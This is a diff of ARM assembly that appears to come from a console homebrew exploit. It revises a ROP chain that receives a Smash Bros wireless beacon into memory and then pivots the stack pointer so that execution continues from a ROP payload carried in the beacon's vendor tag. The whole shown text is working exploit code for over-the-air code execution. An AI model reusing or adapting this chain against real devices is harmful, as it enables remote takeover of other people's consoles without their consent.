@@ -53,7 +53,7 @@ additionaldata_start:
 @ Stack begins here. Once the stack-pivot finishes, sp will be set to here, and "pop {pc}" will be executed.
 ropstackstart:
 .word POP_R0R4SLIPPC
-.word (beaconloadpos-additionaldata_start) + ADDITIONALDATA_ADR @ r0, outbuf
+.word BEACONDATA_ADR @ r0, outbuf
 .word 0x400 @ r1, size
 .word 0 @ r2, u8 id
 .word 0x0014c110 @ r3, wlancommID
@@ -61,14 +61,12 @@ ropstackstart:
 .word 0 @ sl
 .word 0 @ ip
 
-.word NWMUDS_RecvBeaconBroadcastData @ Recv a beacon, with outbuf at TMPBUF_ADR.
+.word NWMUDS_RecvBeaconBroadcastData @ Recv a beacon, with outbuf at BEACONDATA_ADR.
 
 .word POP_LRPC
-.word (beaconloadpos-additionaldata_start) + ADDITIONALDATA_ADR - 4 + (0xc + 0x1c + 0x1bc + 4) @ lr, later moved into sp.
+.word BEACONTAGDATA_OUITYPE80_ADR - 4 @ lr, later moved into sp.
 
-.word MOVSPLR_POPLRPC
-
-beaconloadpos: @ Data from the beacon will be located here once NWMUDS_RecvBeaconBroadcastData finishes. The above ROP sets sp so that ROP continues using the data from smashbros_beacon_rop_payload.s offset 0x4.
+.word MOVSPLR_POPLRPC @ Continue ROP with the ROP-chain from smashbros_beacon_rop_payload.s offset 0x4, loaded with NWMUDS_RecvBeaconBroadcastData(beacon tag OUI type 0x80).
 
 .fill ((_start + 0x34+0xb4) - .), 1, 0xffffffff
 
